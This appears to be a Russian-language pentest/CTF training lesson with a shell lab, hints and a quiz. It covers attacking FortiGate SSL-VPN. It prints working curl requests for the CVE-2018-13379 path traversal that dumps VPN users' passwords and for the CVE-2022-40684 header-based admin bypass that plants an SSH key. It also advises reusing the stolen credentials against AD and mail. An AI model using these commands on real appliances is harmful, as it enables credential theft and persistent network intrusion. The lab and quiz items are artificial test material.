---
id: web-fortinet-ssl-vpn
title: 'Fortinet FortiGate SSL-VPN: CVE-2018-13379 и обход через заголовки'
category: web
parent: web-edge-appliances
difficulty: hard
order: 2
tags: [fortinet, fortigate, sslvpn, traversal, cve-2018-13379, cve-2022-40684]
prerequisites: [web-edge-appliances, web-lfi-path-traversal]
useful_for:
  - 'CTF Web категория'
  - 'Bug bounty'
  - 'Пентест веб-приложений'
estimated_minutes: 75
summary: 'FortiGate SSL-VPN как цель: CVE-2018-13379 path traversal к sslvpn_websession (пароли в открытом виде), обход аутентификации CVE-2022-40684 и OOB-write CVE-2024-21762.'
lab:
  kind: shell
  title: 'Практика: traversal к sslvpn_websession'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Прочитай task.md: там адрес FortiGate и путь `/remote/fgt_lang`.'
    - 'Уязвимость — обход пути через параметр `lang`: `lang=/../../../..` даёт корень ФС.'
    - 'Дочитай до сессионного файла: `/dev/cmdb/sslvpn_websession`.'
    - 'В файле — логины и пароли (base64), а также флаг; сохрани флаг в found.txt и набери `check`.'
---

## Вопрос, с которого всё начинается

Периметр защищён FortiGate: через него сотрудники подключаются по SSL-VPN, а он же фильтрует трафик. На портале входа нет ничего необычного. Но в 2019 году выяснилось, что CVE-2018-13379 позволяет **без аутентификации** прочитать файл, в котором лежат пароли всех подключившихся пользователей — в открытом виде. Список этих паролей годами гулял по форумам. Разберём уязвимость.

## Что такое FortiGate SSL-VPN

**FortiGate** — это межсетевой экран (firewall) с функцией VPN. SSL-VPN-портал — веб-интерфейс на `/remote/`, через который пользователь вводит логин и попадает во внутреннюю сеть. Портал отдаёт статику, формы входа и обработчики аутентификации.

Уязвимость CVE-2018-13379 — в обработчике **`/remote/fgt_lang`**. Он принимает параметр `lang` (язык интерфейса) и подставляет его в путь к файлу локализации. Если не проверять `../`, путь можно вывести за пределы каталога локалей — к любому файлу на устройстве.

## Наш пример: FortiGate 6.0.4

Цель — `https://fortigate.target.example`. Признак:

```
$ curl -s -k -I https://fortigate.target.example/remote/login | grep -i server
Server: xxxxxxxx-xxxxx
```

Скрытый `Server`-заголовок — характерная черта FortiGate. Версию уточняем по `/remote/fgt_lang?lang=/../../../..` (в уязвимых она отдаёт корень) и по статике. Диапазон CVE-2018-13379: 5.4.6–5.6.7, 6.0.0–6.0.4.

## Шаг 1: обход пути к файловой системе

Проверяем traversal неразрушающе — читаем `/etc/passwd`:

```
$ curl -s -k 'https://fortigate.target.example/remote/fgt_lang?lang=/../../../../../../etc/passwd'
root:x:0:0:root:/root:/bin/sh
...
```

`root:x:0:0` в ответе — traversal работает. Теперь целимся в главный файл.

## Шаг 2: читаем sslvpn_websession

Файл `/dev/cmdb/sslvpn_websession` хранит состояние SSL-VPN-сессий, включая **логины и пароли** подключившихся пользователей. Читаем:

```
$ curl -s -k 'https://fortigate.target.example/remote/fgt_lang?lang=/../../../../../../dev/cmdb/sslvpn_websession'
var fgt_lang = "...";
...
172.16.1.50:443:user=jsmith:pass=U2FsdGVkX1...:...
```

Пароли здесь могут быть в base64 или в открытом виде в зависимости от версии. В любом случае это **креды реальных пользователей** — а часто и администраторов, которые подключались по VPN. Это и делает CVE-2018-13379 такой разрушительной: она отдаёт пароли без аутентификации.

## Шаг 3: декодировать и использовать

Если пароль в base64 — декодируем:

```
$ echo 'U2VjcmV0UGFzcw==' | base64 -d
SecretPass
```

Дальше — пробуем креды на самом портале, на других сервисах, в AD. Люди переиспользуют пароли, поэтому VPN-пароль часто открывает и почту, и домен.

## Шаг 4: CVE-2022-40684 — обход аутентификации

Второй вектор — **CVE-2022-40684**: обход аутентификации в административном API через заголовки. Атакующий подставляет заголовки, которые FortiGate считает доверенными:

```
$ curl -s -k -X PUT 'https://fortigate.target.example/api/v2/cmdb/system/admin' \
  -H 'Forwarded: for="127.0.0.1";by="127.0.0.1"' \
  -H 'User-Agent: Report Runner' \
  --data-binary '{"ssh-public-key1":"ssh-rsa AAAA..."}'
```

Через это можно добавить SSH-ключ админа или изменить конфиг — то есть закрепиться. Опять **header trust abuse**.

## Шаг 5: CVE-2024-21762 — OOB write

Свежий баг — out-of-bounds write в SSL-VPN, дающий RCE. Он нестабилен: неудачный payload роняет `sslvpnd`. Поэтому его применяют только с разрешения и на копии.

## Шаг 6: пост-эксплуатация

FortiGate хранит: конфиг с кредами к AD/LDAP (`/api/v2/cmdb/...`), сертификаты и ключи, сессионные файлы, список маршрутов. Через FortiGate часто видны все внутренние сети — он рисует карту.

## Что мы теперь знаем

- FortiGate SSL-VPN — портал на `/remote/`.
- CVE-2018-13379 — traversal в `fgt_lang`, читает `sslvpn_websession` с паролями.
- Пароли в сессиях дают доступ в сеть и часто в AD.
- CVE-2022-40684 — обход аутентификации через заголовки.
- CVE-2024-21762 — нестабильный OOB-write RCE.

## Квиз

Проверь себя.

```quiz
- question: "Что читает CVE-2018-13379?"
  options:
    - "Картинки"
    - "Файл сессий sslvpn_websession с паролями"
    - "robots.txt"
    - "логи"
  answer: 1
  explanation: "Там логины и пароли пользователей VPN."
- question: "В каком параметре traversal?"
  options:
    - "user"
    - "lang в /remote/fgt_lang"
    - "id"
    - "page"
  answer: 1
  explanation: "lang подставляется в путь к файлу."
- question: "Чем опасна CVE-2022-40684?"
  options:
    - "Она красивая"
    - "Обход аутентификации через заголовки → закрепление"
    - "Это XSS"
    - "Это CSRF"
  answer: 1
  explanation: "Через неё добавляют SSH-ключ админа."
- question: "Почему пароли из сессий так ценны?"
  options:
    - "Они короткие"
    - "Их переиспользуют в других системах и AD"
    - "Они зашифрованы"
    - "Они одноразовые"
  answer: 1
  explanation: "Переиспользование открывает другие системы."
- question: "Почему CVE-2024-21762 применяют осторожно?"
  options:
    - "Она медленная"
    - "Неудачный payload роняет sslvpnd"
    - "Она платная"
    - "Она секретная"
  answer: 1
  explanation: "Падение VPN-процесса = потеря доступа."
```

## Куда дальше

Дальше — Ivanti Connect Secure и цепочка auth bypass + cmd injection. А пока запомни: **Fortinet = traversal в fgt_lang → пароли сессий.**

## Где пригодится

- Пентест периметра и VPN.
- Red team: креды без логина.
- CTF: задания на path traversal.
